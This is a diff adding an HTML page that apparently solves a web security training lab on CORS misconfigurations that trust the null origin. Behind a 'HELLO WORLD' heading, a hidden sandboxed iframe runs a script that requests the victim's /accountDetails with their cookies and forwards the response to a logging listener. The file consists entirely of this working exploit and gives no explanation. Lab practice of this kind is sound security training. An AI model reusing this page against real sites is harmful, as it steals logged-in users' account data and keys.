@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS WITH ORIGIN:null</title>
+</head>
+<body>
+    <h1>HELLO WORLD</h1>
+    <iframe style="display: none;" sandbox="allow-scripts" srcdoc="<script>
+        var xhr = new XMLHttpRequest(); 
+        var url = 'https://0a1b0084046695a180f7991a00d30053.web-security-academy.net';
+       
+        // function on ready state
+        xhr.onreadystatechange = function (){
+            if(xhr.readyState == XMLHttpRequest.DONE){
+                fetch('http://127.0.0.1:5555/log?key= ' + xhr.responseText)
+            }
+        }
+
+        xhr.open('GET', url + '/accountDetails', true)
+        xhr.withCredentials = true;
+        xhr.send(null);
+    </script>"></iframe>
+</body>
+</html>
